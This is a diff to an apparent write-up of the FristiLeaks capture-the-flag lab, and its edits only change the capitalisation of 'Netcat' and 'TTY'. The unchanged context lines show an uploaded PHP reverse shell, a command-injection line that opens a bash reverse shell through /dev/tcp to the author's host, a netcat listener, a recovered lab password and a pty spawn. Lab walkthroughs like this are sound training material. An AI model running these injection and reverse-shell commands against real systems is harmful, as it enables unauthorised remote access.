@@ -209,7 +209,7 @@ If I open `/fristi/uploads/shell.php.jpg`, it is displayed as a web page instead
 
 ### Reverse Shells
 
-I decided to upload [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to the site with `netcat` listening on my host. Then I browsed the files and found that `/home/eezeepz` is accessible.
+I decided to upload [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to the site with Netcat listening on my host. Then I browsed the files and found that `/home/eezeepz` is accessible.
 
 On `/home/eezeepz`, there's a file called `note.txt`.
 
@@ -251,7 +251,7 @@ Well, Jerry did say that he only allow commands from /usr/bin/ or /home/admin/. 
 /usr/bin/dir && /bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
 ~~~
 
-Start `netcat` to listen at port 6666.
+Start Netcat to listen at port 6666.
 
 ~~~
 $ nc -lvp 6666
@@ -334,7 +334,7 @@ LetThereBeFristi!
 
 I thought that it was the root's password because of the name of the file, but it doesn't seem to be it. But I checked the file once again and see that it belongs to the user fristigod. I can su to fristigod now.
 
-But before that, I must spawn a tty.
+But before that, I must spawn a TTY.
 
 ~~~
 $ python -c 'import pty;pty.spawn("/bin/bash")'
